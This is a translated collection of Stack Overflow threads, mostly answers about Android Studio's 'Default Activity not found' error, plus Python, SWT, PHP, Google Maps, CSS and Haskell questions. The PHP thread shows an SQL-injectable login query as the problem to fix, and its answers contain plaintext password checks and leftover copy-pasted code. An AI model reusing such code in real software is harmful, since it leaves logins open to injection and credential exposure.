只是分享我是如何解决这个问题的，我没有与意图启动器声明相关的问题，我什至尝试手动声明活动仍然没有工作，还清除了缓存和 tmp 文件夹没有任何工作。由于我有几项活动，我从回购中提取的一项活动似乎有重复的声明

[![在此处输入图像描述](https://i.stack.imgur.com/7M7PX.png)](https://i.stack.imgur.com/7M7PX.png)

* * *

## 回答 #43

> 赞同：1
> 
> 时间：2014-08-26T09:10:02.380

我从一个演示应用开始并对其进行了修改。我将源内部的 java 路径从 com -> example -> foo 更改为我自己的并编辑了清单；然而，Android Studio (0.8.7) 变得非常困惑。

我尝试了上面列出的所有内容，但没有一个对我有用。也许它甚至让事情变得更糟？

我的最终解决方案是通过在 Android Studio（又名文本编辑器）中打开子目录来编辑`<projectname>.iml`子目录`.idea`。

前：

```
<content url="file://$MODULE_DIR$">
  <sourceFolder url="file://$MODULE_DIR$/gen" isTestSource="false" generated="true" />
</content> 
```

我（重新）添加了 src 目录（第二行）。后：

```
<content url="file://$MODULE_DIR$">
  <sourceFolder url="file://$MODULE_DIR$/src" isTestSource="false" />
  <sourceFolder url="file://$MODULE_DIR$/gen" isTestSource="false" generated="true" />
</content> 
```

保存后，Android Studio 重新加载并开始按预期运行。

* * *

## 回答 #44

> 赞同：1
> 
> 时间：2015-07-31T11:14:41.700

将 Android Studio 从 1.2.x 更新到 1.3 后，我遇到了同样的问题，我尝试了所有建议，但没有任何效果。然后我这样做了：

转到运行/调试配置。选择给出错误的配置并将其删除。使用相同的名称和设置创建一个新的。之后，重新连接 USB 电缆并运行应用程序。

这为我解决了这个问题。

* * *

## 回答 #45

> 赞同：1
> 
> 时间：2016-03-14T02:56:03.587

使缓存无效/重新启动

* * *

[![只需重新启动](https://i.stack.imgur.com/AcD7Y.png)](https://i.stack.imgur.com/AcD7Y.png)

* * *

之后，您的应用程序必须运行！

* * *

## 回答 #46

> 赞同：1
> 
> 时间：2017-06-26T09:48:00.927

您可能缺少属性。确保在清单文件中包含此活动

* * *

## 回答 #47

> 赞同：1
> 
> 时间：2017-08-28T11:02:12.670

我遇到了同样的问题。由于某些原因，android Studio 替换了`android:name`大多数 XML 文件中的所有属性，包括`android:subject`Android Studio 无法识别的清单。

[![在此处输入图像描述](https://i.stack.imgur.com/Hu98J.png)](https://i.stack.imgur.com/Hu98J.png)

如上图所示，IDE 无法识别该`android:subject`属性。结果，它将无法读取指定 MainActivty 的行。

解决方案只是将每个更改`android:subject`为`android:name`然后从 Build 菜单 -> Rebuild Project 重新构建项目。重建项目时您可能会遇到相同的问题，因此请执行与上述相同的操作。

* * *

## 回答 #48

> 赞同：1
> 
> 时间：2018-02-19T15:24:26.993

我在 android studio 3.0.1 上一直有这个问题，它是由清单合并失败引起的。出于某种原因，我在消息输出中没有收到任何错误消息。我必须检查合并的清单（app->manifests->AndroidManifest.xml 然后是“合并清单”选项卡），底部有一个错误，表明在 build.gradle 中添加的最新库依赖于其他一些其 minSdk 高于我的应用程序 minSdk 的库。解决方案在此消息中，它是添加

```
<uses-sdk tools:overrideLibrary="timber.log"/> 
```

到 AndroidManifest.xml。实际上这个库（piwik 1.0.2）在它的清单中已经有了这个 overrideLibrary。

奇怪的是，其他队员并没有遇到这个问题。

* * *

## 回答 #49

> 赞同：1
> 
> 时间：2018-10-25T05:49:25.673

转到**`build.gradle`**（项目：xyz）

```
buildscript {
    repositories {
        jcenter() 
        google()
    }
allprojects {
    repositories {
        jcenter()
        google()
    }

// Just place 'google()' to the top of 'jcenter()'

buildscript {
    repositories {
        google()
        jcenter()
    }
allprojects {
    repositories {
        google()
        jcenter()
    // enter code here
    }
} 
```

它非常适合我。

* * *

## 回答 #50

> 赞同：1
> 
> 时间：2018-11-03T16:24:06.557

派对迟到了。只需清洁和重建。问题就会消失。

* * *

## 回答 #51

> 赞同：1
> 
> 时间：2019-03-16T06:10:35.480

我试过无效缓存并重新启动，没有运气。然后我验证了清单，它正确设置了主要活动意图。

我在 File -> Settings -> Build, Execution, Deployment -> Gradle 的 Global Gradle Settings 下检查了“离线工作”

我取消选中它，修改 build.gradle (Project) 以使用不同的 gradle 版本 (com.android.tools.build:gradle:3.3.1) 并保存它以触发 Gradle 同步。

同步后，这个错误消失了，我可以再次调试。

* * *

## 回答 #52

> 赞同：1
> 
> 时间：2019-10-22T17:36:50.660

对我来说，这个问题的发生是因为其他一些原因。因此，即使它有 30 多个答案，我仍然觉得我的解决方案可能会对某人有所帮助。

我`styles.xml`看起来像这样：

```
<style name="AppTheme" parent="...">
    ....
</style>

<style name="AppTheme.NoActionBar" parent="...">
    ....
</style> 
```

我`AndroidManifest.xml`是这样的：

```
<application
    android:label="@string/app_name"
    android:theme="@style/AppTheme">
    ....
</application> 
```

出于某种原因，我决定让我的主题不使用`ActionBar`，所以我继续从我的`styles.xml`. 所以这里是更新的：

```
<style name="AppTheme.NoActionBar" parent="...">
    ....
</style> 
```

除此之外，我还必须更新清单文件中的主题，但我忘记了。因此，当我运行该应用程序时，我收到错误消息：

```
Error: Default Activity Not Found 
```

经过长时间的挣扎，我发现了问题并相应地修改了我的清单文件：

```
<application
    android:label="@string/app_name"
    android:theme="@style/AppTheme.NoActionBar">
    ....
</application> 
```

**结论**：

如果你有一个错误`AndroidManifest.xml`可能导致清单合并失败，那么 AS 可以给出这个错误。

* * *

## 回答 #53

> 赞同：1
> 
> 时间：2019-12-13T13:30:19.917

您可以通过转到“Edit Configurations”菜单（点击“Shift”三次，键入“Edit Configurations”），然后将 Launch Options > Launch 更改为“Nothing”来让 Android Studio 不抱怨。

* * *

## 回答 #54

> 赞同：1
> 
> 时间：2020-06-15T06:13:19.893

采用

> 文件 -> 使缓存无效/重新启动...

然后重新启动机器（PC、笔记本电脑等）

* * *

## 回答 #55

> 赞同：1
> 
> 时间：2020-07-22T13:25:41.390

我在不同的场景中遇到了相同/类似的错误**错误：未找到默认活动**并且无法运行该项目。我发现我的项目`minSdkVersion=16`中的任何一个包都需要`minSdkVersion >= 21`. 我更新了依赖项并再次构建，然后我能够再次运行该项目。

**我使用 Android Studio 4.0.1**

* * *

## 回答 #56

> 赞同：1
> 
> 时间：2020-08-04T14:22:06.033

我面临着同样的问题。就我而言，我不止一次地宣布了一项活动。**删除重复活动后，错误得到解决**。

* * *

## 回答 #57

> 赞同：1
> 
> 时间：2020-10-15T10:36:49.977

Android Studio 4.1 解决了这个问题

* * *

## 回答 #58

> 赞同：0
> 
> 时间：2015-07-23T17:33:15.877

好吧，我有时不懂Android Studio...

我遇到了同样的问题并尝试了这里的答案，但无济于事。然后我更改了一件事：我的意图过滤器中的动作将动作名称全部大写，我将其更改为小，只留下大写单词 MAIN，它解决了问题！多么荒谬！我希望这可以帮助某人。

* * *

## 回答 #59

> 赞同：0
> 
> 时间：2016-05-02T18:19:03.957

这将帮助像我一样登陆此页面的人

我从在线课程中复制粘贴代码后收到错误错误：未找到默认活动。

错误出现在第一行 MainActivity.java 文件中

而不是包 com.example.myname.justjava；

第一行是包 com.example.android.justjava；

来自提供学习的代码

纠正它摆脱了错误

* * *

## 回答 #60

> 赞同：0
> 
> 时间：2016-08-25T07:31:55.130

丑陋但对我有用：

收到此错误消息，我的问题出在一个模块中，我刚刚从模块的清单中完全删除了应用程序标签，并且它起作用了。

（也从模块库中删除 ic_launcher）

曾是：

```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.mymodule"
    android:versionCode="1"
    android:versionName="1.0" >

    <uses-sdk
        android:minSdkVersion="16"
        android:targetSdkVersion="23" />

    <application
        android:allowBackup="true"
        android:icon="@drawable/ic_launcher"
        android:label="@string/app_name"
       >
        <activity
            android:name="com.example.mymodule.MainActivity"
            android:label="@string/app_name" >
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>

</manifest> 
```

现在：

```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.mymodule"
    android:versionCode="1"
    android:versionName="1.0" >

    <uses-sdk
        android:minSdkVersion="16"
        android:targetSdkVersion="23" />

</manifest> 
```

* * *

## 回答 #61

> 赞同：0
> 
> 时间：2017-09-28T08:17:13.143

检查清单中的所有行。

就我而言，我有这个错误：

```
android:theme="@android:style/Theme.Wallpaper.NoTitleBar.Fullscreen" 
```

logcat 中没有任何内容

* * *

## 回答 #62

> 赞同：0
> 
> 时间：2018-01-01T16:57:18.227

我尝试运行一个没有活动的应用程序（它是一个 androidTest 项目）时收到此错误。所以我只是右键单击测试项目，然后从上下文菜单中选择运行或调试。

* * *

## 回答 #63

> 赞同：0
> 
> 时间：2018-03-22T09:19:28.493

有时为所有用户卸载应用程序会有所帮助。转到设置中的应用程序列表转到您的应用程序或滚动到列表末尾，然后将其卸载。希望这可以帮助

* * *

## 回答 #64

> 赞同：0
> 
> 时间：2018-07-20T08:50:23.430

检查*AndroidManifest.xml*文件中的**应用程序**标记内是否存在**活动**标记

 **** * *

## 回答 #65

> 赞同：0
> 
> 时间：2018-08-01T18:52:27.407

```
<activity android:name=".MainActivity">
    <intent-filter>
        <action android:name="android.intent.action.MAIN" />
        <category android:name="android.intent.category.LAUNCHER" />
    </intent-filter>
</activity> 
```

只需将其添加到您的清单文件中的标签中，只需替换`MainActivity`为您的默认活动`android.intent.action.youractivity`即可

* * *

## 回答 #66

> 赞同：0
> 
> 时间：2018-09-07T02:45:12.810

希望这个答案对某人有所帮助。

如果您已经拥有`<intent-filter>`标签，请确保您正确关闭了所有标签。

我的错误是我`<activity>`只用 a`</>`而不是`</activity>`.

* * *

## 回答 #67

> 赞同：0
> 
> 时间：2018-10-19T14:50:42.710

TL;博士：

确保您不仅检查`action`和`category`名称，而且检查路径。特别是如果您进行了重构。

我的解决方案是仔细检查`AndroidManifest`文件。我做了一个重构，它不仅更新了意图过滤器，还更新了意图过滤器名称的路径：

```
 //type and value were added to the path here when I did the refactor
 <action android:name="android.intent.type.MAIN"/>
 <category android:name="android.intent.value.LAUNCHER"/> 
```

它应该是：

```
<action android:name="android.intent.action.MAIN"/>
<category android:name="android.intent.category.LAUNCHER"/> 
```

* * *

## 回答 #68

> 赞同：0
> 
> 时间：2019-02-24T21:57:22.323

如果上述选项不起作用，请尝试删除 .gradle 文件夹。

我正在使用 Android Studio 3.3.1。我所有的项目都很好，当他们突然停止工作说没有活动时。即使是全新的项目也显示出同样的错误。数小时后使缓存无效，尝试修复清单文件。我注意到它与像 (androidx.core:core-ktx) 这样的 androidx 库有一些关系。在某些项目中，仅更新库即可解决问题，但实际起作用的是删除 .gradle 文件夹。

* * *

## 回答 #69

> 赞同：0
> 
> 时间：2019-10-19T16:38:06.580

此解决方案应该适合您：

1.  转到编辑配置。

2.  选择活动不选择任何内容并应用。

* * *

## 回答 #70

> 赞同：0
> 
> 时间：2020-01-17T01:41:51.743

没有一个答案对我有用。错误信息说

> 无法从 ../path/to/the/apk 读取清单
> 
> 未找到默认活动

该错误告诉我，Android Studio 正在以某种方式读取以前构建的 apk。因此，我确实`./gradlew clean`摆脱了为我解决问题的文件夹。

* * *

## 回答 #71

> 赞同：0
> 
> 时间：2020-07-13T12:17:16.170

升级到 Android Studio 4.0 后发生在我身上。

我试图使缓存无效，删除并再次创建 Android App 配置，选择特定的 Launch 活动，但我总是收到错误消息，指出该活动未在 AndroidManifest.xml 上定义，但它当然是。

对我有用的是运行/调试配置（在其中定义启动选项），在对话框底部的启动前删除“Gradle-aware Make”。我成功运行了该应用程序，然后再次添加了“Gradle-aware Make”，一切正常。

没有意义，我知道。巴士就是我所做的。

* * *

## 回答 #72

> 赞同：0
> 
> 时间：2020-07-31T02:19:41.257

就我而言，发生这种情况是因为存在明显的合并错误并且我试图运行该应用程序。通过运行查看具体错误`Build->Make Project`

* * *

## 回答 #73

> 赞同：0
> 
> 时间：2020-08-23T16:05:25.967

转到清单文件，然后去合并清单文件查看错误并解决清单问题

清理项目并运行

* * *

## 回答 #74

> 赞同：0
> 
> 时间：2020-12-03T13:00:47.283

我的问题是：在我的应用程序模块清单中，我必须替换其他依赖模块清单标记

我在应用程序标签下添加了下面的代码，它对我有用

```
tools:replace="android:allowBackup, android:usesCleartextTraffic" 
```

对您来说，这可能是由于其他一些属性，您也必须覆盖它们

* * *

## 回答 #75

> 赞同：-4
> 
> 时间：2015-06-08T20:47:20.307

配置新项目时

公司名称应以 .app 结尾，例如应为 android.example.com.app 而不应为 android.example.com*******

# python - python效率和内存中的大对象

> ID：15825086
> 
> 赞同：9
> 
> 时间：2013-04-05T02:50:02.733
> 
> 标签：python, memory-management, garbage-collection

我有多个进程，每个进程都处理具有 40000 个元组的列表。这几乎最大化了机器上的可用内存。如果我这样做：

```
 while len(collection) > 0:
            row = collection.pop(0)
            row_count = row_count + 1
            new_row = []
            for value in row:
                if value is not None:
                    in_chars = str(value)
                else:
                    in_chars = ""

                #escape any naughty characters
                new_row.append("".join(["\\" + c if c in redshift_escape_chars else c for c in in_chars]))
            new_row = "\t".join(new_row)
            rows += "\n"+new_row
            if row_count % 5000 == 0:
                gc.collect() 
```

这会释放更多内存吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-05T05:31:22.447

由于它以与增长`collection`相同的速度缩小，因此`rows`您的内存使用量将保持稳定。这个`gc.collect()`电话不会有太大的不同。

CPython 中的内存管理很微妙。仅仅因为您删除引用并运行收集周期并不一定意味着内存将返回给操作系统。有关详细信息，请参阅[此答案](https://stackoverflow.com/a/5495318/1002469)。

为了真正节省内存，您应该围绕生成器和迭代器而不是大型项目列表来构建此代码。我很惊讶你说你有连接超时，因为获取所有行不应该比一次获取一行并执行你正在做的简单处理花费更多的时间。也许我们应该看看你的 db-fetching 代码？

如果一次一行的处理确实不可能，那么至少将您的数据保留为不可变的双端队列，并使用生成器和迭代器对其执行所有处理。

我将概述这些不同的方法。

首先，一些常用的功能：

```
# if you don't need random-access to elements in a sequence
# a deque uses less memory and has faster appends and deletes
# from both the front and the back.
from collections import deque
from itertools import izip, repeat, islice, chain
import re

re_redshift_chars = re.compile(r'[abcdefg]')

def istrjoin(sep, seq):
    """Return a generator that acts like sep.join(seq), but lazily

    The separator will be yielded separately
    """
    return islice(chain.from_iterable(izip(repeat(sep), seq)), 1, None)

def escape_redshift(s):
    return re_redshift_chars.sub(r'\\\g<0>', s)

def tabulate(row):
    return "\t".join(escape_redshift(str(v)) if v is not None else '' for v in row) 
```

现在理想的是一次行处理，如下所示：

```
cursor = db.cursor()
cursor.execute("""SELECT * FROM bigtable""")
rowstrings = (tabulate(row) for row in cursor.fetchall())
lines = istrjoin("\n", rowstrings)
file_like_obj.writelines(lines)
cursor.close() 
```

这将占用尽可能少的内存——一次只占用一行。

如果确实需要存储整个结果集，可以稍微修改一下代码：

```
cursor = db.cursor()
cursor.execute("SELECT * FROM bigtable")
collection = deque(cursor.fetchall())
cursor.close()
rowstrings = (tabulate(row) for row in collection)
lines = istrjoin("\n", rowstrings)
file_like_obj.writelines(lines) 
```

现在我们将所有结果收集到`collection`first 中，它完全保留在内存中以供整个程序运行。

但是，我们也可以复制您在使用时删除收集项的方法。*我们可以通过创建一个在工作时清空其源集合*的生成器来保持相同的“代码形状” 。它看起来像这样：

```
def drain(coll):
    """Return an iterable that deletes items from coll as it yields them.

    coll must support `coll.pop(0)` or `del coll[0]`. A deque is recommended!
    """
    if hasattr(coll, 'pop'):
        def pop(coll):
            try:
                return coll.pop(0)
            except IndexError:
                raise StopIteration
    else:
        def pop(coll):
            try:
                item = coll[0]
            except IndexError:
                raise StopIteration
            del coll[0]
            return item
    while True:
        yield pop(coll) 
```

现在，您可以轻松地在您想随时释放内存时进行`drain(collection)`替换。`collection`用完后`drain(collection)`，`collection`对象将为空。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-05T04:56:39.183

如果您的算法依赖于从左侧或列表开头弹出，您可以使用[集合中的](http://docs.python.org/2/library/collections.html)[deque](http://docs.python.org/2/library/collections.html#collections.deque)对象作为更快的替代方案。

作为对比：

```
import timeit

f1='''
q=deque()
for i in range(40000):
    q.append((i,i,'tuple {}'.format(i)))

while q:
    q.popleft()
'''

f2='''
l=[]
for i in range(40000):
    l.append((i,i,'tuple {}'.format(i)))

while l:
    l.pop(0)
'''

print 'deque took {:.2f} seconds to popleft()'.format(timeit.timeit(stmt=f1, setup='from collections import deque',number=100))
print 'list took {:.2f} seconds to pop(0)'.format(timeit.timeit(stmt=f2,number=100)) 
```

印刷：

```
deque took 3.46 seconds to to popleft()
list took 37.37 seconds to pop(0) 
```

因此，对于从列表或队列开头弹出的这种特殊测试，`deque`速度要快 10 倍以上。

然而，这一巨大优势仅适用于左侧。如果您使用 pop() 对两者运行相同的测试，则速度大致相同。您还可以将列表反转并从右侧弹出，以获得与双端队列中的 popleft 相同的结果。

* * *

就“效率”而言，处理数据库中的单行会更有效率。如果这不是一个选项，请处理您的列表（或双端队列）“集合”。

沿着这些思路尝试一些东西。

首先，拆分行处理：

```
def process_row(row):
    # I did not test this obviously, but I think I xlated your row processing faithfully
    new_row = []
    for value in row:
        if value:
            in_chars = str(value)        
        else
            in_char=''
        new_row.append("".join(["\\" + c if c in redshift_escape_chars else c for c in in_chars]))  
    return '\t'.join(new_row) 
```

现在看看使用双端队列来允许从左侧快速弹出：

```
def cgen(collection):
    # if collection is a deque:
    while collection:
        yield '\n'+process_row(collection.popleft()) 
```

或者如果你想坚持一个列表：

```
def cgen(collection):
    collection.reverse()
    while collection:
        yield '\n'+process_row(collection.pop()) 
```

我认为你原来的 pop(0) 方法，处理行，每 5000 行调用一次 gc 可能不是最理想的。无论如何，gc 将被自动调用的频率远远高于此。

我的最终建议：

1.  使用`deque`. 它就像一个`list`但更快的左侧推送或弹出；
2.  使用`popleft()`这样您就不需要反转列表（如果顺序`collection`有意义）；
3.  作为生成器处理您的收藏；
4.  抛弃调用 gc 的概念，因为它对你没有任何作用。
5.  如果您可以只调用数据库并获得 1 行并一次处理 1 行，请在此处抛出 1-4！

# java - 创建子shell后Java SWT菜单栏项卡在“on”上

> ID：15825088
> 
> 赞同：1
> 
> 时间：2013-04-05T02:50:22.987
> 
> 标签：java, user-interface, swt

这无疑是一个微不足道的问题，但我似乎无法弄清楚我做错了什么。情况很简单：我有一个应用程序，它创建了一个额外的对话框窗口来向用户显示一些东西。主应用程序有一个菜单栏，其中包含具有键盘快捷键的菜单项。当我使用键盘快捷键调用菜单项并且主程序创建新窗口时，当用户*关闭*新窗口并再次显示主应用程序时，菜单栏项保持突出显示/“打开”外观. 使用 SWT 4.2 复制我在 Mac OS 上看到的代码是这样的：

```
import org.eclipse.swt.SWT;
import org.eclipse.swt.events.SelectionAdapter;
import org.eclipse.swt.events.SelectionEvent;
import org.eclipse.swt.layout.FillLayout;
import org.eclipse.swt.widgets.Button;
import org.eclipse.swt.widgets.Display;
import org.eclipse.swt.widgets.Menu;
import org.eclipse.swt.widgets.MenuItem;
import org.eclipse.swt.widgets.Shell;

public class tester
{
    public static void createShell(Shell parent) {
        final Shell newShell = new Shell(parent, SWT.DIALOG_TRIM | SWT.RESIZE);
        newShell.setSize(100,100);
        newShell.setLayout(new FillLayout());

        Button closeButton = new Button(newShell, SWT.NONE);
        closeButton.setText("Close");
        closeButton.addSelectionListener(new SelectionAdapter() {
            @Override
            public void widgetSelected(SelectionEvent arg0) {
                newShell.close();
            }
        });

        newShell.open();
    }

    public static void main(String[] args) {
        Display display = new Display();
        final Shell shell = new Shell(display);
        shell.setLayout(new FillLayout());
        shell.setSize(200, 100);

        Menu menuBar = new Menu(shell, SWT.BAR);
        shell.setMenuBar(menuBar);

        MenuItem item = new MenuItem(menuBar, SWT.CASCADE);
        item.setText("Foo");

        Menu fooMenu = new Menu(item);
        item.setMenu(fooMenu);

        MenuItem barMenu = new MenuItem(fooMenu, SWT.NONE);
        barMenu.setText("Menu item");
        barMenu.setAccelerator(SWT.MOD1 + 'F');
        barMenu.addSelectionListener(new SelectionAdapter() {
            @Override
            public void widgetSelected(SelectionEvent arg0) {
                createShell(shell);
            }
        });

        shell.open();
        while (!shell.isDisposed()) {
            if (!display.readAndDispatch()) {
                display.sleep();
            }
        }
        display.dispose();
    }
} 
```

要重现该问题，请运行上述程序，从键盘调用 Command-F，然后单击创建的窗口中的“关闭”按钮。它将关闭第二个窗口并返回原始窗口。这是我这样做后的示例：

![截屏](https://s1.postimg.org/y2dfo4lj3/problem.png)

问题是“Foo”如何保持突出显示。我希望它不会保持突出显示。事实上，如果我拉下菜单并选择菜单项，它*不会*保持突出显示，所以使用键盘快捷键会导致这种情况有一些特定的东西，但我正在努力弄清楚那是什么可能。

有人可以告诉我我做错了什么吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T07:07:02.283

我看不出该代码有什么问题。所以剩下的就是解决这个问题。虽然这表明存在黑客攻击，但它确实有效。这个想法是将执行推迟到稍后的时间，不是太晚，而是在足够的时间之后，以便事件完成并且项目被停用。使用的第一次测试`Display.getDefault().asyncExec()`没有按预期工作，所以我尝试了 with 的组合，`invokeLater`但这`asyncExec`不会有什么结果。那时我选择了一个锤子并`Thread.currentThread().sleep()`结合上述方法跟注，这似乎工作得很好。

所有需要改变的是`SelectionAdapter`barMenu 的，如下所示：

```
 barMenu.addSelectionListener(new SelectionAdapter() {
        @Override
        public void widgetSelected(SelectionEvent arg0) {
            // invoke later to give event time to finish, and have
            // the menu item deselected
            javax.swing.SwingUtilities.invokeLater(new Runnable() {
              public void run() {
              // wait
              try { Thread.currentThread().sleep(100);} catch(Exception ex){}
              // jump back to the SWT thread and do the actual work
              Display.getDefault().asyncExec(new Runnable() {
              public void run() {
               createShell(shell);
              }});
            }});
        }
    }); 
```

# php - 清理一些 SQL 查询

> ID：15825089
> 
> 赞同：0
> 
> 时间：2013-04-05T02:50:33.627
> 
> 标签：php, sql

什么是最简单和最有效的消毒方法：

```
$q = "SELECT * FROM `admin` " 
."WHERE `username`=' ".$_POST["username"]."' " 
."AND `passcode`=' ".$_POST["password"]."' " 
```

另外，我正在学习 PHP，所以如果您能提供解释、提示、建议或更多清理内容以防止 SQL 注入的方法，将不胜感激

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T02:55:11.470

我喜欢使用 $mysqli `prepared statements`- 这是来自 PHP 站点的示例：

说明（请参阅底部以获取使用您的代码的示例）：

您将查询中的变量替换为`?`标记，然后再将`bind`变量替换为标记。

```
$city = "Amersfoort";

/* create a prepared statement */
if ($stmt = $mysqli->prepare("SELECT District FROM City WHERE Name=?")) {

    /* bind parameters for markers */
    $stmt->bind_param("s", $city);

    /* execute query */
    $stmt->execute();

    /* bind result variables */
    $stmt->bind_result($district);

    /* fetch value */
    $stmt->fetch();

    printf("%s is in district %s\n", $city, $district);

    /* close statement */
    $stmt->close();
}

/* close connection */
$mysqli->close(); 
```

* * *

**使用您的代码的示例：**

```
$q = "SELECT * FROM `admin` " 
."WHERE `username`= ? AND passcode = ?";

/* create a prepared statement */
    if ($stmt = $mysqli->prepare($q)) {

        /* bind parameters for markers */
        $stmt->bind_param("ss", $_POST['username'], $_POST['password']);

        /* execute query */
        $stmt->execute();

        /* bind result variables */
        $stmt->bind_result($district);

        /* fetch value */
        $stmt->fetch();  // This can also be while($stmt->fetch()){ Code here }

        printf("%s is in district %s\n", $city, $district);

        /* close statement */
        $stmt->close();
    }

    /* close connection */
    $mysqli->close(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T02:55:13.927

如果你真的必须知道它会是这样的：

```
$q = "SELECT * FROM `admin` " 
."WHERE `username`=' ".mysql_real_escape_string($_POST["username"])."' " 
."AND `passcode`=' ".mysql_real_escape_string($_POST["password"])."' " 
```

但正如其他人所说，您应该使用最有可能的 PDO 或 mysqli 因为所有 mysql_ 命令都已弃用。

# jquery - 谷歌地图模拟随机运动

> ID：15825094
> 
> 赞同：1
> 
> 时间：2013-04-05T02:51:13.593
> 
> 标签：jquery, google-maps, google-maps-api-3

我计划构建一个应用程序来模拟**谷歌地图**上的运动，但是我没有看到任何我想要的例子。我想要得到的运动是沿着随机路径的运动基本上我想从一个特定的预定义点向前移动大头针，没有中断或跳过点，然后在一段时间后让我们说在一个方向移动 10 分钟后向左或向右转，停止，前进或后退等等。

我不想使用已经定义的路径。运动是否偏离道路并不重要，只要运动按顺序进行，没有中断。我还希望能够每 10 秒记录一次运动。我不确定必须注册哪个事件侦听器来处理此问题或如何处理此问题。

我想使用**jquery**来实现它。我接受任何建议、示例和演示（*示例不必采用代码片段的形式。它可以是关于如何修改 longlat 坐标以模拟路径的公式*）。基本上，如果我知道如何增加 longlat 坐标以向前移动，但我不了解如何操作 longlat 坐标。

**这就是我的想法：**

找到一种方法来增加坐标以直线移动，然后修改度数以转动，然后再次移动，然后转动，依此类推。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T03:12:57.733

开始[`the docs`](https://developers.google.com/maps/documentation/javascript/overlays)。去那里搜索“动画符号”（不能直接链接到该部分）。至于改变方向，取决于您的标记移动多远，您可能需要 Haversine 公式，该公式位于[可移动类型](http://www.movable-type.co.uk/scripts/latlong.html)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-05T04:03:51.767

Google 有一个名为 Google Playground 的 noce 工具，您可以使用 Google Maps Api V3 查看此动画示例

[https://code.google.com/apis/ajax/playground/?exp=earth#animate_v3](https://code.google.com/apis/ajax/playground/?exp=earth#animate_v3)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-08-02T21:11:47.733

我做了一些代码来模拟北/南和东/西

```
public static double eastMove(double d, double lat) {

    System.out.println("old North no longitude " + "," + lat);
    double newLatitude;
    double coef = d * 0.0000089;

    newLatitude = lat + coef;
    return newLatitude;
}

public static double northMove(double d, double lat, double lon) {

    System.out.println("old east" + lon + "," + lat);
    double newlongitude;

    double coef = d * 0.0000089;

    newlongitude = lon + coef / Math.cos(lat * 0.018);

    return newlongitude;
} 
```

使用这两个功能：

```
 newLongitude = northMove(15,Latitude,longitude);

    System.out.print("to North location");
    System.out.print(newLongitude );

    System.out.print(",");
    System.out.println(Latitude);

    newLatitude = eastMove(15,latitude);

    System.out.print("to East location");
    System.out.print(Longitude);

    System.out.print(",");
    System.out.println(newLatitude ); 
```

# html - 将样式应用于元素，仅当某个元素旁边存在时

> ID：15825098
> 
> 赞同：9
> 
> 时间：2013-04-05T02:51:41.023
> 
> 标签：html, css

我`<section>`在几个页面上使用了标签，但在一个页面上我使用了一个`<aside>`前面有标签的`<section>`标签。

如果我有一个`<section>`紧随其后的`<aside>`，我想对两者都应用一个宽度，并使部分向左浮动，而旁边的浮动向右。

基本上，如果我有一个`<section>`并且`<aside>`我希望样式像这样工作：

```
section {
    width: 500px;
    float: left;
    padding: 8px;
}

aside {
    padding:8px; 
    width:400px;
    float:right;
} 
```

如果我只有`<section>`我希望它是这样的：

```
section {
    padding: 8px;
} 
```

有没有办法可以使用 CSS3 中的条件语句或伪类来做到这一点，而无需使用 JavaScript、自定义类或单独的 CSS 文件？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-04-05T02:55:08.410

这仅在`<section/>`之后才有效`<aside/>`：

```
<aside>content</aside>
<!-- if there is another node in between, use the '~' selector -->
<section>content</section> 
```

在这种情况下，您可以使用`aside ~ section`or `aside + section`：

```
section {
    padding: 8px;
}
aside + section {
    width: 500px;
    float: left;
} 
```

在所有其他情况下，您必须使用 JavaScript，因为这些选择器只能在一个方向上工作，从上到下。

~~使用 CSS4 可能有一种方法可以将[选择器的 Subject 与 Child 组合器一起使用](http://css4-selectors.com/selector/css4/subject-of-selector-with-child-combinator/)，但那是未来。~~此选择器已从规范中删除。

# class - 对类型类参数的 Haskell 类型强制

> ID：15825102
> 
> 赞同：1
> 
> 时间：2013-04-05T02:51:54.020
> 
> 标签：class, haskell, types

我正在尝试阅读一本机器学习书籍，并且对我正在尝试使我的代码具有通用性的未来内容有所了解。

这是我的代码。我最终将拥有其他 DataSet 实例，但这就是我现在所拥有的。

```
data SupervisedDataSet x y = SupervisedDataSet [([x], y)] deriving (Show)       

class DataSet a where                                                           
 augment :: x -> a -> a --Augment each input vector, making x the head.                                                       

instance DataSet (SupervisedDataSet x y) where                                   
  augment v (SupervisedDataSet ds) =·                                           
    let xsys = unzip ds in                                                      
      SupervisedDataSet $ zip (map (v:) $ fst xsys) (snd xsys) 
```

我正在尝试按照 GHC 中的类型检查器的要求`SupervisedDataSet`使用第一个参数来强制执行第一个参数的类型。`augment`

```
Perceptron.hs:16:7:
  Couldn't match type `x1' with `x'
    `x1' is a rigid type variable bound by
         the type signature for
           agument :: x1 -> SupervisedDataSet x y -> SupervisedDataSet x y
         at Perceptron.hs:14:3
    `x' is a rigid type variable bound by
        the instance declaration at Perceptron.hs:13:37
  Expected type: SupervisedDataSet x1 y
    Actual type: SupervisedDataSet x y
  In the expression:
    SupervisedDataSet $ zip (map (v :) $ fst xsys) (snd xsys)
  In the expression:
    let xsys = unzip ds
    in SupervisedDataSet $ zip (map (v :) $ fst xsys) (snd xsys) 
```

我明白为什么我会收到错误，我只是不知道如何解决它。任何想法，将不胜感激。谢谢

谢谢你的时间。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T03:24:25.863

```
class DataSet a where
  augment :: x -> a -> a 
```

可以写成

```
class DataSet a where
  augment :: forall x . x -> a -> a 
```

试试吧

```
data SupervisedDataSet x y = SupervisedDataSet [([x], y)] deriving (Show) 

class DataSet f where
  augment :: a -> f a b -> f a b

instance DataSet SupervisedDataSet where
  augment v (SupervisedDataSet ds) =
    let xsys = unzip ds in
      SupervisedDataSet $ zip (map (v:) $ fst xsys) (snd xsys) 
```

